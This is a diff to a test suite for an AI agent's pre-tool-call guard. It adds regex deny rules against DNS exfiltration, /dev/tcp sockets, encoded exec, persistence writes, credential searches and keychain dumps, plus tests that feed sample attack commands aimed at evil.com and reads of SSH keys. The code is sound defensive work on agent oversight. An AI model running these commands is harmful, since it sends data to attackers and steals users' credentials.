@@ -728,6 +728,49 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
     applies_to: ["exec", "bash", "web_fetch", "web_search"],
   },
   {
+    id: "INV_NO_DNS_EXFILTRATION",
+    rule: "regex_deny pattern: /\\b(nslookup|dig\\s|host\\s)\\b/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block DNS lookup commands that could exfiltrate data via hostname encoding",
+  },
+  {
+    id: "INV_NO_BASH_TCP",
+    rule: "regex_deny pattern: /\\/dev\\/(tcp|udp)\\//i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block bash built-in TCP/UDP connections via /dev/tcp and /dev/udp",
+  },
+  {
+    id: "INV_NO_ENCODED_EXEC",
+    rule: "regex_deny pattern: /\\b(base64|atob|decode)\\b.*\\b(exec|eval|system|popen|subprocess)\\b|\\b(exec|eval|system|popen|subprocess)\\b.*\\b(base64|atob|decode)\\b/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block encoded payload execution that hides blocked operations behind encoding",
+  },
+  {
+    id: "INV_NO_PERSISTENCE_WRITE",
+    rule: "regex_deny pattern: /\\b(LaunchAgents|LaunchDaemons|cron\\.d|crontab|systemd|init\\.d|autostart|startup)\\b/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block writes to persistence mechanisms that execute on login or boot",
+    applies_to: ["exec", "bash", "write"],
+  },
+  {
+    id: "INV_NO_CREDENTIAL_HARVESTING",
+    rule: "regex_deny pattern: /\\b(find|locate|grep|rg|ag)\\b.*(\\.env|\\.pem|\\.key|secret|credential|password|authorized_keys)/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block credential hunting commands that search for sensitive files",
+  },
+  {
+    id: "INV_NO_KEYCHAIN_ACCESS",
+    rule: "regex_deny pattern: /\\bsecurity\\s+(find-generic-password|find-internet-password|dump-keychain)\\b/i",
+    enforcement: "halt",
+    type: "regex_deny",
+    description: "Block macOS keychain credential extraction via security CLI",
+  },
+  {
     id: "INV_ESCALATE_SCRIPT_EXEC",
     rule: "regex_deny pattern: /\\b(python[23]?|node|ruby|perl|bash|sh|zsh)\\s+\\S+\\.(py|js|rb|pl|sh|zsh)\\b/i",
     enforcement: "warn",
@@ -888,8 +931,8 @@ describe("invariant escalation bypass prevention", () => {
       { toolName: "write" }
     );
 
-    // Write tool: regex fallback does NOT run (only exec/bash/web_fetch/web_search)
-    // UNKNOWN_TYPE checks are ignored by verdict override
+    // Write tool runs regex eval but exec-specific invariants default to
+    // applies_to: ["exec","bash"] so they don't match here
     expect(result).toEqual({ blocked: false });
   });
 
@@ -1094,6 +1137,234 @@ describe("invariant escalation bypass prevention", () => {
     const result = await hook(
       { toolName: "exec", params: { command: "python3 --version" } },
       { toolName: "exec" }
+    );
+
+    expect(result).toEqual({ blocked: false });
+  });
+
+  it("exec with nslookup is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "nslookup evil.com" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block DNS lookup commands");
+  });
+
+  it("exec with /dev/tcp is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "echo test > /dev/tcp/evil.com/80" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block bash built-in TCP/UDP connections");
+  });
+
+  it("exec with base64 + exec is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "python3 -c 'import base64; exec(base64.b64decode(\"abc\"))'" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block encoded payload execution");
+  });
+
+  it("write to LaunchAgents is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "write", params: { path: "~/Library/LaunchAgents/com.evil.plist", content: "<plist>...</plist>" } },
+      { toolName: "write" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
+  });
+
+  it("write to normal path is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "write", params: { path: "/tmp/notes.txt", content: "hello world" } },
+      { toolName: "write" }
+    );
+
+    expect(result).toEqual({ blocked: false });
+  });
+
+  it("exec with find searching for .env/.key is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "find ~ -name '.env' -o -name '*.key'" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block credential hunting commands");
+  });
+
+  it("exec with security find-generic-password is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "security dump-keychain -d" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block macOS keychain credential extraction");
+  });
+
+  it("read of .sanna/keys path is ESCALATED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "escalate",
+      reason: "must_escalate: read .sanna/keys",
+      boundary_type: "must_escalate",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "read", params: { path: "/home/user/.sanna/keys/signing.key" } },
+      { toolName: "read" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Sanna requires approval");
+  });
+
+  it("read of .ssh path is ESCALATED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "escalate",
+      reason: "must_escalate: read .ssh",
+      boundary_type: "must_escalate",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "read", params: { path: "/home/user/.ssh/id_rsa" } },
+      { toolName: "read" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Sanna requires approval");
+  });
+
+  it("read of normal file is ALLOW", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "read", params: { path: "/home/user/project/readme.md" } },
+      { toolName: "read" }
     );
 
     expect(result).toEqual({ blocked: false });
